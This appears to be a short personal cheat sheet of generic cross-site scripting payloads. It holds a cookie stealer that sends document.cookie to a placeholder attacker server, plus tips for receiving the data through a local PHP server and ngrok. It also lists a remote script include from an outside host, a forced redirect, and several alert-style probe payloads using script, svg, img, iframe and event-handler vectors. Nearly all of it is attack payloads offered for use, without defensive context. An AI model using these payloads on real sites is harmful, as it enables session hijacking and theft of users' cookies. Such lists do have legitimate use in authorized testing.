# Generic xss payloads.

### Maybe useful payloads:

```js
//cookie stealer
<script>document.location=“http://yourserver.com/?c="+document.cookie;</script>
/*
For example, to start a little server with php and ngrok i do:
php -S localhost:<port>
ngrok http <port>
*/
```

```js
//redirect
<script>window.location="https://example.com"</script>
```

```js
//include a remote or local script
<script src="https://sussy.com/yourscript.js"></script>
```

### Other:

```js
<script>alert("hello")</script>
document.write(location.search("><svg onload=alert(1)>"))
<svg/onload=alert("hi")>
<img src=x onerror="alert('hello');">
<iframe src=”javascript:alert(1)”></iframe>
<var onmouseover="prompt(1)">move the cursor here</var>
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<script>confirm(document.domain)</script>
```

